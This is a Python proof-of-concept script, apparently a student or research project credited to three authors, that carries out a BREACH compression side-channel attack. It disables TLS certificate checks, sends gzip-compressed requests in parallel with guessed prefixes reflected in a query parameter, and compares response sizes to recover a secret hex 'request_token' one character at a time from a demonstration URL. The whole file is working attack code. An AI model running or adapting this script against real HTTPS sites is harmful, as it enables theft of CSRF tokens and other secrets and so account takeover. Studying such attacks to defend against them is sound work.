####    ####   #####   #     ####  #   #
#   #   #   #  #      # #   #      #   #
####    ####   ####  #####  #      #####
#   #   #  #   #     #   #  #      #   #
####    #   #  ##### #   #   ####  #   #

#############################################################
########################## Authors: #########################
#############################################################
#                                                           #
#            # Javier Díaz de Rábago Pemán                  #
#            # Carlos Marí Noguera                          #
#            # Carlos Martin de Argila Lorente              #
#                                                           #
#############################################################
#############################################################
#############################################################

####    ####   #####   #     ####  #   #
#   #   #   #  #      # #   #      #   #
####    ####   ####  #####  #      #####
#   #   #  #   #     #   #  #      #   #
####    #   #  ##### #   #   ####  #   #


import requests
import time
import urllib3
import concurrent.futures 
# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target
url = 'https://malbot.net/poc/'
param_name = 'request_token'
possible_chars = '0123456789abcdef'


padding = '{}'
# Initial guess
guessed_token = ''

def get_response_length(url, param_name, guess):
    # Construct full url
    full_url = f"{url}?{param_name}=%27{guess}"
    print(f"Fetching URL: {full_url}")

    headers = {
        'Accept-Encoding': 'gzip, deflate'  # Compress response
    }
    try:
        # Get page
        response = requests.get(full_url, headers=headers, verify=False, stream=True)
        response.raise_for_status()

        # Disable automatic decompression
        response.raw.decode_content = False

        # Read the raw compressed response
        compressed_content = response.raw.read()
        compressed_length = len(compressed_content)
        return compressed_length
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None


def guess_token(url, param_name, possible_chars, padding):
    guessed_token = ''
    padding_amount = 1
    while True:
        found_char = False

        # we launch parallel tasks to fetch response lengths for each candidate char.
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            # Map returns results in the same order, so we can still break early if we wish.
            results = list(executor.map(
                lambda c: (
                    c,
                    [
                        get_response_length(url, param_name, guessed_token + c + padding*padding_amount + '@'),
                        get_response_length(url, param_name, guessed_token + padding*padding_amount + c + '@')
                    ]
                ),
                possible_chars
            ))

        # Now check the results in order (same order as possible_chars)
        for c, response_lengths in results:
            if None in response_lengths:
                continue
            print(f"Trying '{guessed_token + c}': response lengths = {response_lengths}")

            # If LZ77 compressed, the character is correct
            if response_lengths[1] > response_lengths[0]:
                print(f"Found character: '{c}'")
                guessed_token += c
                found_char = True
                padding_amount = 1
                break

        # If we never found a character in this iteration, increase padding or exit
        if not found_char:
            if padding_amount < 6:
                padding_amount += 1
                print(f"Increasing padding to {padding_amount}")
            else:
                # print("Not found. Exiting")
                break

    print(f"Guessed token: '{guessed_token}'")
    return guessed_token


def main():
    # Test different padding lengths
    guessed_tokens = {}
    guessed_tokens[1] = guess_token(url, param_name, possible_chars, padding)


if __name__ == '__main__':
    main()
